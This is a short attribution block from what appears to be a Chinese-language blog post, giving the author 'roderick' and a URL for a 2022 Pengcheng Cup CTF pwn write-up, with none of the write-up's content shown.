> 作者: [roderick](https://roderickchan.github.io)  
> URL: https://roderickchan.github.io/zh-cn/2022-07-06-2022-%E9%B9%8F%E7%A8%8B%E6%9D%AF-ctf-pwn/  

